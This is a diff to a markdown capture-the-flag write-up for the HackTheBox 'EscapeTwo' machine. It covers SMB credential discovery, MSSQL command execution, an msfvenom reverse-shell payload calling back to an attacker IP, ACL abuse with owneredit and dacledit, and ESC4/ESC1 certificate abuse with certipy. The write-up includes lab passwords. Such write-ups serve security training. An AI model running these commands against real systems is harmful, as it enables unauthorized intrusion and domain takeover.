@@ -162,6 +162,13 @@ nxc smb sequel.htb -u rose -p KxEPkKe6R8su -M spider_plus -o DOWNLOAD_FLAG=True 
 Within the <strong>"Accounting Department"</strong> file share, we discover two Excel files: <code>accounting_2024.xlsx</code> and <code>accounts.xlsx</code>. However, both files appear to be corrupted and cannot be opened normally. After some research on Excel file signatures, we find that valid <code>.xlsx</code> files should start with the magic bytes <code>50 4B 03 04</code>. By restoring the correct file signature, we are able to successfully open both documents. Further analysis of <code>accounts.xlsx</code> reveals multiple sets of credentials.
 </p>
 
+![Accounting Department Share](./assets/img/ctf/hackthebox/escapetwo/escapetwo5.png)
+![Credentials - accounts.xlsx](./assets/img/ctf/hackthebox/escapetwo/escapetwo6.png)
+
+<p style="text-align: justify;">
+We reuse the credentials recovered from the SMB shares against the MSSQL service and discover that <code>sa:&lt;REDACTED&gt;</code> is a valid login on the database instance. Since <code>sa</code> has administrative privileges (dba) on MSSQL, we leverage NetExec’s MSSQL command execution feature to obtain a reverse shell on the target system as the <code>sql_svc</code> user.
+</p>
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.140 LPORT=7575 -f exe -o escape.exe
 
@@ -171,12 +178,6 @@ nxc mssql dc01.sequel.htb --local-auth -u sa  -p '<REDACTED>' -x C:\\Users\\Publ
 
 nc -lvnp 7575
 ```
-![Accounting Department Share](./assets/img/ctf/hackthebox/escapetwo/escapetwo5.png)
-![Credentials - accounts.xlsx](./assets/img/ctf/hackthebox/escapetwo/escapetwo6.png)
-
-<p style="text-align: justify;">
-We reuse the credentials recovered from the SMB shares against the MSSQL service and discover that <code>sa:&lt;REDACTED&gt;</code> is a valid login on the database instance. Since <code>sa</code> has administrative privileges (dba) on MSSQL, we leverage NetExec’s MSSQL command execution feature to obtain a reverse shell on the target system as the <code>sql_svc</code> user.
-</p>
 
 ![mssql](./assets/img/ctf/hackthebox/escapetwo/escapetwo7.png)
 ![Command Execution](./assets/img/ctf/hackthebox/escapetwo/escapetwo8.png)
@@ -222,6 +223,21 @@ After importing the <code>bloodhound-python</code> data into BloodHound CE, we i
 ![GenericAll DunderMifflinAuthentication Certificate Template](./assets/img/ctf/hackthebox/escapetwo/escapetwo17.png)
 
 <p style="text-align: justify;">
+  First, we change the owner of the <code>ca_svc</code> user object to <code>ryan</code> and grant
+  <code>ryan</code> full control over the <code>ca_svc</code> account. This allows us, as
+  <code>ryan</code>, to reset the password of <code>ca_svc</code> without knowing the current one.
+</p>
+
+```bash
+owneredit.py 'sequel.htb/ryan:WqSZAF6CysDQbGb3' -new-owner ryan -target ca_svc -action write 
+
+dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+
+net rpc password "ca_svc" "newP@ssword2022" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "10.129.185.52"
+```
+![WriteOwner Abuse](./assets/img/ctf/hackthebox/escapetwo/escapetwo18.png)
+
+<p style="text-align: justify;">
 By abusing the <code>GenericAll</code> permissions on the vulnerable certificate template (<strong>ESC4</strong>), we modify the template configuration to make it exploitable under <strong>ESC1</strong>. Specifically, we update the template to allow user-supplied Subject Alternative Names (UPN). Once the template is weakened, we exploit ESC1 by requesting a certificate on behalf of the <code>administrator</code> account. The resulting certificate, combined with the <code>KPINIT</code> extension, allows us to authenticate as a domain administrator, recover the NT hash, and gain full access to the domain controller via WinRM.
 </p>
 
@@ -235,12 +251,11 @@ certipy req -username ca_svc@sequel.htb -password 'newP@ssword2022' -ca $CA  -te
 # Certificate Authentication
 certipy auth -pfx administrator.pfx
 ```
-![WriteOwner Abuse](./assets/img/ctf/hackthebox/escapetwo/escapetwo18.png)
 ![ESC4-ESC1](./assets/img/ctf/hackthebox/escapetwo/escapetwo19.png)
 ![WinRM as Administrator](./assets/img/ctf/hackthebox/escapetwo/escapetwo20.png)
 
 ## Kill Chain Summary
-1. Enumerate SMB shares and recover exposed credentials from the Accounting Department share.
+1. Enumerate SMB shares and recover credentials from the Accounting Department share.
 2. Reuse leaked credentials to authenticate to MSSQL as sa and achieve command execution.
 3. Obtain a reverse shell as the sql_svc service account.
 4. Extract plaintext credentials from the SQL Server installation configuration file.
